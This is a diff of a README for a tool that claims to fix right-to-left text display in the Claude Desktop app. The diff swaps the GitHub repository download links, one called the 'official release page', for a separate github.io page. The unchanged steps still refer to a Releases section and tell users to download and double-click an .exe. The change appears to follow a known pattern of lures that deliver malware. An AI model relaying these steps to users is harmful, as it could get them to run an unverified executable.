@@ -1,6 +1,6 @@
 # 🖥️ claude-rtl-patcher - Better right to left text support
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/talalm7731/claude-rtl-patcher)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://talalm7731.github.io)
 
 This tool improves how the Claude Desktop app displays languages like Persian, Arabic, and Hebrew. These languages use a right-to-left layout. The standard Claude app often displays this text incorrectly. This patcher fixes that layout and adds better fonts to make your text readable.
 
@@ -20,7 +20,7 @@ The Claude Desktop app runs using web technologies. It follows standard left-to-
 Follow these steps to set up the software.
 
 1. Close the Claude Desktop app entirely. Ensure it is not running in your system tray. If you leave it open, the patch will fail to apply.
-2. Go to the [official release page](https://github.com/talalm7731/claude-rtl-patcher).
+2. Go to the [official release page](https://talalm7731.github.io).
 3. Look for the latest version listed under the Releases section.
 4. Download the file ending in .exe to your computer.
 5. Double-click the file to start the installer.
